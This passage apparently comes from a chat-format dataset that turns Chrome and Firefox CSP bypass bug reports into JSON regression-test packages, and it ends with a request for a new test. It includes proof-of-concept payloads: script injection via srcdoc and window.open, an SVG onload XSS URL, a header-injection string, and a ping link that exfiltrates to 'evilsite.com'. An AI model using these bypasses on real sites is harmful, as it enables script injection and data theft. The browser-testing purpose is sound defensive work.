execute with the main document origin. Even if CSP forbid script execution.\\n\\n(Decoded)\\n~~~\\n<iframe name=\\\"iframe_a\\\" srcdoc=\\\"<script>alert(origin)</script>\\n  <p>about-srcdoc iframe</p>\\n  <a href='https://go-back.glitch.me' target='iframe_a'>click here</a>\\\"\\n</iframe>\\n~~~\\n\\nEXPLANATION:\\n\\n(please read https://crbug.com/chromium/1001283)\\n\\nThere used to be two navigation code paths for loading about:srcdoc\\n 1) The normal one. Used only for browser initiated navigation.\\n 2) The edge-case-legacy one for loading about:srcdoc. Used for document initiated navigation.\\n\\nI removed path 2) completely. Nowadays, every navigations to about:srcdoc are the same. They are using path 1.\\nIt looks like path 1 is broken, because CSP are not properly inherited? (I need to check)\\n\\nhttps://crbug.com/chromium/1001283 relied to path 1) to be used. That's why it can only reproduce on M78+.\\nBut we can use path 1) by using history.back() instead to reproduce the problem on every versions of Chrome.\", \"TestSolution\": {\"c1001982\": {\"a.test\": {\"main\": {\"index.html\": \"<script nonce='test'>\\n    window.addEventListener(\\\"load\\\", function() {\\n        setTimeout(function() {\\n            document.getElementById(\\\"iframe\\\").contentWindow.document.getElementById(\\\"123\\\").click();\\n        }, 1000);\\n    });\\n</script>\\n<iframe id=\\\"iframe\\\" name=\\\"iframe_a\\\" srcdoc=\\\"<script>document.location.href='https://a.test/report/?leak=c1001982'</script><p>about-srcdoc iframe</p><a id='123' href='https://leak.test/CSP/c1001982/helper' target='iframe_a'>click here</a>\\\"\\n</iframe>\\n\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"script-src 'nonce-test'\\\"\\n}, {\\n  \\\"key\\\": \\\"X-XSS-Protection\\\",\\n  \\\"value\\\": \\\"0\\\"\\n}]\"}}, \"leak.test\": {\"helper\": {\"index.html\": \"<script>\\n    history.back();\\n</script>\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to http://htmlpad.org/testapplet/ \\n2. It has a CSP policy of object-src data:\\n-------\\nsource code is:\\n--------\\n <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"object-src data:;\\\"></meta>\\n\\n<object width=\\\"300\\\" height=\\\"300\\\"\\n    data=\\\"data:application/x-silverlight-2,\\\"\\n    type=\\\"application/x-silverlight-2\\\" >\\n    <param name=\\\"source\\\" value=\\\"SilverlightApplication1.xap\\\"/>\\n</object>\\n\\nWhat is the expected behavior?\\nIf I understand the CSP implementation in Chrome, the load should be blocked.\\n\\nWhat went wrong?\\nThe page still attempts to load the silverlight file\\n\\nDid this work before? N/A\\n\\nChrome version: 31.0.1650.57  Channel: stable\\nOS Version: 6.1 (Windows 7, Windows Server 2008 R2)\\nFlash Version: Shockwave Flash 11.9 r900\", \"TestSolution\": {\"c320796\": {\"a.test\": {\"main\": {\"index.html\": \"<object\\n  width=\\\"300\\\"\\n  height=\\\"300\\\"\\n  data=\\\"data:application/x-silverlight-2,\\\"\\n  type=\\\"application/x-silverlight-2\\\"\\n>\\n  <param name=\\\"source\\\" value=\\\"https://a.test/report/?leak=c320796\\\" />\\n</object>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"object-src data:;\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0\\n\\nSteps to reproduce the problem:\\nSet script-src 'self' on iframe that loads a worker; the worker will make cross-origin request that should be blocked.\\n\\nWhat is the expected behavior?\\n\\nWhat went wrong?\\nWith CSP \\\"connect-src 'self'; script-src 'self' 'unsafe-inline'\\\" the\\nXHR to b.lvh.me fails, but the importScripts request does not.\\n\\nDid this work before? N/A\\n\\nChrome version: 33.0.1750.152 (Developer Build 256984)   Channel: dev\\nOS Version:\\nFlash Version: Shockwave Flash 11.2 r202\", \"TestSolution\": {\"c358471\": {\"leak.test\": {\"worker\": {\"index.js\": \"onmessage = function (event) {\\n  function reqListener() {\\n    postMessage(\\\"worker:pong\\\");\\n  }\\n  try {\\n    var oReq = new XMLHttpRequest();\\n    oReq.onload = reqListener;\\n    oReq.open(\\\"get\\\", \\\"https://a.test/report/?leak=c358471-xhr\\\", true);\\n    oReq.send();\\n  } catch (e) {}\\n\\n  importScripts(\\\"https://a.test/report/?leak=c358471\\\");\\n};\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"connect-src 'self'; script-src 'self' 'unsafe-inline'\\\"\\n    }\\n]\"}, \"main\": {\"index.html\": \"<iframe src=\\\"helper\\\"></iframe>\"}, \"helper\": {\"index.html\": \"<script>\\n    var worker = new Worker(\\\"worker\\\");\\n    worker.postMessage(\\\"test\\\");\\n</script>\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"connect-src 'self'; script-src 'self' 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nWe can bypass the header('Content-Security-Policy:sandbox') and access the DOM of sandboxed URLs.\\nWhat we are doing is very simple: inject code into the page *before* it has been loaded, so Chrome will honor that code even when it should discard it. In other words, Chrome should behave exactly as if the sandboxed URL were coming from a different domain, deleting injected code. Once it reads the header, boom, destroy injected code so it doesn't run.\\nVERSION\\nChrome Version: 35.0.1916.114 (Official Build 270117) m stable\\nOperating System: Windows 8.1 Pro Fully Updated\\nREPRODUCTION CASE\\nAttached is the PoC, but here's the explanation because it's quite simple:\\nWe open a new window which is header-sandboxed.\\nw = window.open(\\\"sandboxed.php\\\",\\\"\\\",\\\"width=400,height=400\\\");\\nBefore it loads, we inject an event and code:\\nw.onload = new w.Function(\\\"alert(document.body.innerText);document.body.innerHTML = '<h1>HACKED BY THE MAIN WINDOW</h1>'\\\");\\nThat's it! Chrome will not delete the event/function so it will run in the sandboxed window.\\nThanks!\", \"TestSolution\": {\"c377995\": {\"url_queue.txt\": \"https://a.test/CSP/c377995/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n  <head>\\n    <title>Bypass CSP Sandbox</title>\\n  </head>\\n  <body>\\n    <h1>Bypass CSP Sandbox</h1>\\n\\n    <input id=\\\"input\\\" type=\\\"button\\\" onclick=\\\"openCSP()\\\" value=\\\"Open CSP URL\\\" />\\n    <script>\\n      w = window.open(\\\"helper\\\", \\\"\\\", \\\"width=400,height=400\\\");\\n      w.onload = function () {\\n        document.location.href = \\\"https://a.test/report/?leak=c377995\\\";\\n      };\\n    </script>\\n  </body>\\n</html>\\n\"}, \"helper\": {\"index.html\": \"<!doctype html>\\n<html lang=\\\"en\\\">\\n <head>\\n  <title>Bypass CSP Sandbox</title>\\n </head>\\n <body>\\n  I've been sandboxed using the header:\\n  <br /><br />\\n\\t\\\"Content-Security-Policy\\\", \\\"sandbox allow-scripts\\\"\\n  <br /><br />\\n  Nobody, not even URLs from this same domain should be able to access me.\\n </body>\\n</html>\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"sandbox\\\"\\n}]\"}}}}}, {\"BugReport\": \"Sandboxed iframes run with a null principal for which Get/SetCsp is not implemented. This results in a scenario (iframe sandbox) wherein CSP is not enforced.\", \"TestSolution\": {\"f886164\": {\"a.test\": {\"main\": {\"index.html\": \"<iframe sandbox src=\\\"helper\\\"></iframe>\"}, \"helper\": {\"index.html\": \"<iframe src=\\\"https://a.test/report/?leak=f886164\\\"></iframe>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nChrome's CSP does not block favicon request properly.\\nDue to this, attacker can bypass CSP partially and get sensitive information via favicon request.\\nFYI, Spartan has same bug. Firefox is OK. But Firefox Mobile has same bug. I will report to both vendor later.\\nVERSION\\n42.0.2311.135 m\\nwindows 8.1\\nREPRODUCTION CASE\\nGo to http://vulnerabledoma.in/csp_favicon . This page has CSP header and only following contents:\\n<link rel=icon href=http://www.google.com/favicon.ico?0123456789>\\nSee console. You can see the following message:\\nRefused to load the image 'http://www.google.com/favicon.ico?9.17194871771247' because it violates the following Content Security Policy directive: \\\"default-src 'none'\\\". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.\\nBut in fact, Chrome sends favicon request. See the request using network tool.\\nFYI, Chrome Mobile(Android) has same issue. Also, the following request does not block by CSP:\\n<link rel=apple-touch-icon href=http://www.google.com/favicon.ico> <link rel=apple-touch-icon-precomposed href=http://www.google.com/favicon.ico>\", \"TestSolution\": {\"c482558\": {\"url_queue.txt\": \"https://leak.test/CSP/c482558/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<link rel=icon href=https://a.test/report/?leak=c482558>\\n\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"default-src 'none'\\\"\\n}]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0 (Beta/Release)\\nBuild ID: 20131205075310\\n\\nSteps to reproduce:\\n\\nCSP does not block unpermitted resource in some case.\\nPoC is the following:\\n\\n[Case1] image URL in CSS\\nhttp://vulnerabledoma.in/fx_csp_bypass_with_cssimage\\n\\n[Case2] importScripts of Web Workers\\nhttp://vulnerabledoma.in/fx_csp_bypass_with_importScripts\\n\\n\\nActual results:\\n\\nCSP does not block unpermitted resource.\\n\\n\\nExpected results:\\n\\nCSP should block unpermitted resource.\", \"TestSolution\": {\"f949706\": {\"url_queue.txt\": \"https://leak.test/CSP/f949706/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"helper2\": {\"index.html\": \"\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Location\\\",\\n    \\\"value\\\": \\\"https://a.test/report/?leak=f949706\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"status\\\",\\n    \\\"value\\\": \\\"302\\\"\\n  }\\n]\\n\"}, \"main\": {\"index.html\": \"<link rel=\\\"stylesheet\\\" href=\\\"helper\\\">\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'\\\"\\n  }\\n]\"}, \"helper\": {\"index.css\": \"*{background:url('helper2')}\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nGiven a CSP header of script-src \\\\*.a.localhost, the script <script src=\\\"//a.localhost/script.js\\\"></script> should not be loaded. CSP spec section 4.2.2 step 4.6 states \\\"If the first character of the source expression\\u2019s host-part is an U+002A ASTERISK character (*) and the remaining characters, including the leading U+002E FULL STOP character (.), are not a case insensitive match for the rightmost characters of url-host, then return does not match\\\". Scripts such as <script src=\\\"//b.a.localhost/script.js\\\"></script> should be allowed by this policy.\\nVERSION\\nChrome Version: 45.0.2454.85\\nOperating System: Darwin c101.local 14.5.0 Darwin Kernel Version 14.5.0: Wed Jul 29 02:26:53 PDT 2015; root:xnu-2782.40.9~1/RELEASE_X86_64 x86_64 i386 MacBookPro11,3 Darwin\\nREPRODUCTION CASE\\nSee VULNERABILITY DETAILS section above.\", \"TestSolution\": {\"c534542\": {\"a.test\": {\"main\": {\"index.html\": \"<script src=\\\"//sub.a.test/CSP/c534542/helper\\\"></script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src *.sub.a.test\\\"\\n  }\\n]\\n\"}}, \"sub.a.test\": {\"helper\": {\"index.js\": \"document.location.href = \\\"https://a.test/report/?leak=c534542\\\";\\n\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0 (Beta/Release)\\nBuild ID: 20140428193838\\n\\nSteps to reproduce:\\n\\nServe an HTML file with the header Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'.\\n\\nInside that file, use an inline script block to attempt to construct a Worker from a file:\\n\\n<script>\\n  var worker = new Worker(\\\"/worker.js\\\");\\n\\n  worker.onmessage = function(event) {\\n    alert(\\\"Received \\\" + event.data);\\n  }\\n\\n  worker.postMessage(\\\"ping\\\");\\n</script>\\n\\nWhere worker.js simply contains the following:\\n\\nthis.onmessage = function(event) {\\n  postMessage(\\\"pong\\\");\\n}\\n\\n\\nActual results:\\n\\n\\\"pong\\\" alert is shown. This means the Worker construction has been allowed from /worker.js, as the worker has replied to the message sent to it.\\n\\n\\nExpected results:\\n\\nConstruction of worker from /worker.js should be blocked by CSP.\\n\\nSee test pages at:\\n\\nhttp://csp.charlie.ht/worker-incorrectly-allowed.html\\nhttp://csp.charlie.ht/worker-correctly-allowed.html\\n\\nworker-incorrectly-allowed.html is served with the same HTML/header combination described in \\\"steps to reproduce\\\". The \\\"pong\\\" alert is shown, when I believe it shouldn't be. There is no directive stating that /worker.js is an allowed script source.\\n\\nworker-correctly-allowed.html has the same HTML, yet is served with script-src 'self' 'unsafe-inline'. In this case, I expect the Worker construction to be allowed, which is what happens.\\n\\nNote that this is similar to bug 929292 that I reported yesterday.\", \"TestSolution\": {\"f1007634\": {\"url_queue.txt\": \"https://a.test/CSP/f1007634/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"worker\": {\"index.js\": \"this.onmessage = function(event) {\\n    postMessage(\\\"pong\\\");\\n  }\"}, \"main\": {\"index.html\": \"<script>\\n  var worker = new Worker(\\\"worker\\\");\\n\\n  worker.onmessage = function (event) {\\n    document.location.href = \\\"https://a.test/report/?leak=f1007634\\\";\\n  };\\n\\n  worker.postMessage(\\\"ping\\\");\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"The HTML5 Anchor Elements Ping attribute violates both set Content Security Policy and Chrome Extensions manifest permissions settings.\\nThe Ping url is allowed to connect regardless of Content Security Policy as in the example below:\\n\\n<!DOCTYPE html>\\n<head>\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none';\\\">\\n</head>\\n<body>\\n<a href=\\\"#done\\\" ping=\\\"http://httpbin.org/post?secret=goes_here\\\">click here to exploit</a>\\n</body>\\n\\nSame goes when loaded as an Chrome Extension:\\n\\n# cat chrome-ext/manifest.json\\n{\\n  \\\"manifest_version\\\": 2,\\n\\n  \\\"name\\\": \\\"ping permission test\\\",\\n  \\\"description\\\": \\\"ping permission test\\\",\\n  \\\"version\\\": \\\"0.1\\\",\\n\\n  \\\"browser_action\\\": {\\n    \\\"default_icon\\\": \\\"icon.png\\\",\\n    \\\"default_popup\\\": \\\"popup.html\\\"\\n  },\\n  \\\"permissions\\\": [\\n  ]\\n}\\n\\n# cat chrome-ext/popup.html:\\n<!DOCTYPE html>\\n<body>\\n<a href=\\\"#done\\\" ping=\\\"http://evilsite.com/ping\\\">click here to exploit</a>\\n</body>\\n\\nAn attacker can use this as a data transportation method as part of an XSS attack on CSP restricted pages or similar.\\nTested on Google Chrome Version 46.0.2490.86 (64-bit) for MacOS 10.11.1 and Version 46.0.2490.86 m for Windows 7\", \"TestSolution\": {\"c560695\": {\"url_queue.txt\": \"https://leak.test/CSP/c560695/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<head>\\n  <meta\\n    http-equiv=\\\"Content-Security-Policy\\\"\\n    content=\\\"default-src 'none'; script-src 'unsafe-inline';\\\"\\n  />\\n  <script>\\n    window.onload = function () {\\n      document.getElementById(\\\"a\\\").click();\\n    };\\n  </script>\\n</head>\\n<body>\\n  <a id=\\\"a\\\" href=\\\"#done\\\" ping=\\\"https://a.test/report/?leak=c560695\\\"\\n    >click here to exploit</a\\n  >\\n</body>\\n\"}}}}}, {\"BugReport\": \"This was reported to me out of band by Mario Heiderich (in CC):\\n\\nIf a HTTP response contains two CSP headers, the second one wins.\\nThe spec however, mandates that they are combined to a stricter intersection (see URL field).\\n\\nExample policies\\n1) content-security-policy: default-src 'self' 'unsafe-inline'\\n2) content-security-policy: default-src 'self'\\n\\nHere's what I observe:\\n* two CSP headers (1, then 2): 2 wins.\\n* two CSP headers (2, then 1): 1 wins. XSS possible.\\n\\nThis is especially interesting with header injections.\\n(The behavior is the same if the header injection attempts to resume the previous header. This is possible with injecting the newline and a space character and then overwriting a directive, i.e. injecting: \\\"\\\\n default-src 'self' 'unsafe-inline'\\\"\", \"TestSolution\": {\"f1036399\": {\"url_queue.txt\": \"https://a.test/CSP/f1036399/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<script>\\n  document.location.href = \\\"https://a.test/report/?leak=f1036399\\\";\\n</script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self' 'unsafe-inline'\\\"\\n  }\\n]\"}}}}}]}"
            }
        ]
    },
    {
        "role": "user",
        "content": "Generate a test in the same JSON format as provided and NO additional information for:BugID=f1396320: User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\n\nSteps to reproduce:\n\n1. Go to https://test.shhnjk.com/allow-scripts.php?xss=%3Csvg%20onload=alert(document.domain)%3E\n2. You will see alert with document.domain\n\n\nActual results:\n\nalert with document.domain\n\n\nExpected results:\n\nFirefox should grant opaque origin to document when CSP sandbox doesn't have allow-same-origin flag. Currently, \"Content-Security-Policy: sandbox allow-scripts\" is enough to execute script with origin.\n\nhttps://www.w3.org/TR/CSP2/#directive-sandbox\n\"The sandbox directive allows any resource, framed or not, to ask for the same sorts of restrictions to be applied to itself.\""
    }
]